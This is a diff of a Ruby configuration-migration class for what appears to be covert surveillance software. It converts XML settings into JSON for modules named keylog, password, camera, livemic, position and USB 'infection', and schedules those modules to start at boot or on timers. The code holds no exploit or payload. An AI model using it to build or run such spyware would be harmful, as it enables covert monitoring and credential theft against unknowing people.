@@ -90,9 +90,10 @@ class ConfigMigration
           globals[:type] = value.first['type']
         end
       end
+      globals[:migrated] = true
       globals[:version] = 20111231
       globals[:nohide] = []
-      
+
       return globals
     end
 
@@ -104,18 +105,20 @@ class ConfigMigration
       items.each do |item|
         e = {}
         e[:start] = item['action'].to_i
-        e[:repeat] = -1
-        e[:end] = -1
+        e[:enabled] = true
+        #e[:repeat] = -1
+        #e[:end] = -1
         (item.keys.delete_if {|x| x == 'action' or x == 'actiondesc'}).each do |ev|
           e[:event] = ev
+          e[:desc] = ev
           params = item[ev].first
-          e[:end] = params['endaction'].to_i unless params['endaction'].nil?
+          e[:end] = params['endaction'].to_i unless params['endaction'].nil? or params['endaction'].to_i == -1
           case ev
             when 'process'
               e[:window] = params['window'] == 'false' ? false : true
               e[:focus] = params['focus'] == 'false' ? false : true
               e[:process] = params['content']
-            when 'screensaver', 'ac', 'simchange', 'standby'
+            when 'simchange', 'ac', 'standby', 'screensaver'
               # no parameters
             when 'connection'
               e.merge! params
@@ -146,22 +149,25 @@ class ConfigMigration
               e[:number] = params['number']
               e[:text] = params['text']
             when 'timer'
-              e[:type] = params['type']
-              case e[:type]
+              case params['type']
                 when 'date'
-                  e[:date] = params['content']
+                  e[:event] = 'date'
+                  e[:datefrom] = params['content']
                 when 'daily'
-                  e[:hour_from] = params['hour'].first.to_i
-                  e[:minute_from] = params['minute'].first.to_i
-                  e[:second_from] = params['second'].first.to_i
-                  e[:hour_to] = params['endhour'].first.to_i
-                  e[:minute_to] = params['endminute'].first.to_i
-                  e[:second_to] = params['endsecond'].first.to_i
-                when 'loop', 'after startup'
-                  e[:hour] = params['hour'].first.to_i
-                  e[:minute] = params['minute'].first.to_i
-                  e[:second] = params['second'].first.to_i
+                  e[:ts] = "%02d:%02d:%02d" % [params['hour'].first.to_i, params['minute'].first.to_i, params['second'].first.to_i]
+                  e[:te] = "%02d:%02d:%02d" % [params['endhour'].first.to_i, params['endminute'].first.to_i, params['endsecond'].first.to_i]
+                when 'loop'
+                  e[:event] = 'timer'
+                  e[:ts] = "00:00:00"
+                  e[:te] = "23:59:59"
+                  e[:repeat] = e[:start]
+                  e[:delay] = params['hour'].first.to_i * 3600 + params['minute'].first.to_i * 60 + params['second'].first.to_i
+                when 'after startup'
+                  e[:event] = 'timer'
+                  e[:ts] = "00:00:00"
+                  e[:te] = "23:59:59"
                 when 'after install'
+                  e[:event] = 'afterinst'
                   e[:days] = params['day'].first.to_i
               end
             else
@@ -203,8 +209,9 @@ class ConfigMigration
               when 'uninstall'
                 # no parameters
               when 'agent'
+                subaction[:action] = 'module'
                 subaction[:status] = s['action']
-                subaction[:agent] = s['name']
+                subaction[:module] = s['name']
               else
                 raise "unknown subaction: " + sub
             end
@@ -218,21 +225,21 @@ class ConfigMigration
     end
 
     def parse_agents(items)
-      agents = []
+      modules = []
 
-      return agents if items.nil?
+      return modules if items.nil?
 
       items.each do |item|
         a = {}
-        a[:agent] = (item.keys.delete_if {|x| x == 'enabled'}).first
+        a[:module] = (item.keys.delete_if {|x| x == 'enabled'}).first
         a[:enabled] = item['enabled'] == 'false' ? false : true
-        case a[:agent]
-          when 'application', 'chat', 'clipboard', 'keylog', 'organizer', 'password', 'calllist'
+        case a[:module]
+          when 'application', 'chat', 'clipboard', 'device', 'keylog', 'password', 'calllist', 'url'
             # no parameters
-          when 'call', 'device', 'camera', 'mic', 'mouse', 'position', 'print', 'url', 'snapshot', 'conference', 'livemic'
-            a.merge! item[a[:agent]].first
+          when 'call', 'camera', 'mic', 'mouse', 'position', 'print', 'snapshot', 'conference', 'livemic'
+            a.merge! item[a[:module]].first
           when 'crisis'
-            t = item[a[:agent]].first
+            t = item[a[:module]].first
             a[:network] = {:enabled => t['network'].first['enabled'] == 'false' ? false : true,
                            :processes => t['network'].first['process']} unless a[:network].nil?
             a[:hook] = {:enabled => t['hook'].first['enabled'] == 'false' ? false : true,
@@ -243,34 +250,84 @@ class ConfigMigration
             a[:camera] = t['camera'] == 'false' ? false : true unless t['camera'].nil?
             a[:position] = t['position'] == 'false' ? false : true unless t['position'].nil?
           when 'infection'
-            t = item[a[:agent]].first
+            t = item[a[:module]].first
             a[:local] = t['local'] == 'false' ? false : true
             a[:usb] = t['usb'] == 'false' ? false : true
             # false by default on purpose
             a[:mobile] = false
           when 'file'
-            a.merge! item[a[:agent]].first
+            a.merge! item[a[:module]].first
             a['accept'] = a['accept'].first['mask'] unless a['accept'].nil?
             a['deny'] = a['deny'].first['mask'] unless a['deny'].nil?
           when 'messages'
-            item[a[:agent]].each do |mes|
+            item[a[:module]].each do |mes|
               a.merge! mes
             end
             a['sms'] = a['sms'].first unless a['sms'].nil?
             a['mms'] = a['mms'].first unless a['mms'].nil?
             a['mail'] = a['mail'].first unless a['mail'].nil?
+          when 'organizer'
+            # we need to split this agent in two
+            a[:module] = 'addressbook'
+            modules << a.dup
+            a[:module] = 'calendar'
           else
-            raise "unknown agent: " + a[:agent]
+            raise "unknown agent: " + a[:module]
         end
-        agents << a
+        modules << a
       end
 
-      return agents
+      return modules
+    end
+
+    def agents_on_startup(modules, actions, events)
+
+      subactions = []
+
+      modules.each do |m|
+        subactions << {:action => 'module', :status => 'start', :module => m[:module]} if m[:enabled]
+        m.delete(:enabled)
+      end
+
+      start_action = {:desc => 'STARTUP', :subactions => subactions}
+
+      actions << start_action
+
+      event = {:event => 'timer', :desc => 'On Startup', :enabled => true,
+               :ts => '00:00:00', :te => '23:59:59',
+               :start => actions.size - 1}
+
+      events << event
+    end
+
+    def agents_with_repetition(modules, actions, events)
+      modules.each do |m|
+        if m.has_key?('interval')
+          action = {:desc => "#{m[:module]} iteration", :subactions => [{:action => 'module', :status => 'start', :module => m[:module]}] }
+          actions << action
+          event = {:event => 'timer', :desc => "#{m[:module]} loop", :enabled => true,
+                   :ts => '00:00:00', :te => '23:59:59',
+                   :repeat => actions.size - 1, :delay => m['interval']}
+          if m.has_key?('iterations')
+            event[:iter] = m['iterations']
+            m.delete('iterations')
+          end
+          events << event
+          m.delete('interval')
+          if m[:module] == 'snapshot'
+            if m['newwindow']
+              event = {:event => 'window', :desc => "new win #{m[:module]}", :enabled => true, :start => actions.size - 1}
+              events << event
+            end
+            m.delete('newwindow')
+          end
+        end
+      end
     end
 
     def xml_to_json(content)
 
-      agents = []
+      modules = []
       actions = []
       events = []
       globals = {}
@@ -287,7 +344,7 @@ class ConfigMigration
             when 'actions'
               actions = parse_actions(section[1].first['action'])
             when 'agents'
-              agents = parse_agents(section[1].first['agent'])
+              modules = parse_agents(section[1].first['agent'])
           end
         end
       rescue Exception => e
@@ -295,7 +352,10 @@ class ConfigMigration
         trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
       end
 
-      config = {'agents' => agents, 'actions' => actions, 'events' => events, 'globals' => globals}
+      agents_on_startup(modules, actions, events)
+      agents_with_repetition(modules, actions, events)
+
+      config = {'modules' => modules, 'actions' => actions, 'events' => events, 'globals' => globals}
 
       return config.to_json
     end
